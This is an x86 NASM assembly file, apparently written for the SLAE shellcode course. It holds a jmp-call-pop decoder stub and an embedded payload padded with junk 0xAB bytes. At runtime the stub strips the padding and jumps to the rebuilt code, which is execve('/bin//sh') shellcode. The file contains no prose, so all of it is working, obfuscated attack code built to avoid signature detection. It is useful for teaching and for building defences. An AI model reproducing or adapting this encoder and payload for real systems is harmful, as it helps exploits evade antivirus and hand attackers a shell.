; Filename: Decoder-Skeleton.nasm
; Author  : Andrea Perfetti
; SLAE ID : SLAE - 1547


global _start			

section .text

_start:
	jmp short ShellcodeIntoStack

Decode:	
	pop esi

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

Loop:	
	inc ebx
	inc ecx
	
	mov byte al, [esi + ebx]
	cmp eax, 0xFF
	je Execute

	inc ebx
	add ebx, eax

	mov BYTE dl, [esi + ebx]
	mov BYTE [esi + ecx], dl

	jmp short Loop
	
Execute:
	xor edx, edx
	mov [esi + ecx], dl
	jmp esi  		;Leave control to decoded shellcode

ShellcodeIntoStack:
	call Decode
	Shellcode: db 0x31,0x2,0xAB,0xAB,0xc0,0x3,0xAB,0xAB,0xAB,0x50,0x3,0xAB,0xAB,0xAB,0x68,0x3,0xAB,0xAB,0xAB,0x2f,0x3,0xAB,0xAB,0xAB,0x2f,0x1,0xAB,0x73,0x2,0xAB,0xAB,0x68,0x3,0xAB,0xAB,0xAB,0x68,0x4,0xAB,0xAB,0xAB,0xAB,0x2f,0x2,0xAB,0xAB,0x62,0x3,0xAB,0xAB,0xAB,0x69,0x4,0xAB,0xAB,0xAB,0xAB,0x6e,0x3,0xAB,0xAB,0xAB,0x89,0x4,0xAB,0xAB,0xAB,0xAB,0xe3,0x4,0xAB,0xAB,0xAB,0xAB,0x50,0x1,0xAB,0x89,0x1,0xAB,0xe2,0x1,0xAB,0x53,0x4,0xAB,0xAB,0xAB,0xAB,0x89,0x3,0xAB,0xAB,0xAB,0xe1,0x4,0xAB,0xAB,0xAB,0xAB,0xb0,0x3,0xAB,0xAB,0xAB,0xb,0x1,0xAB,0xcd,0x3,0xAB,0xAB,0xAB,0x80,0xFF
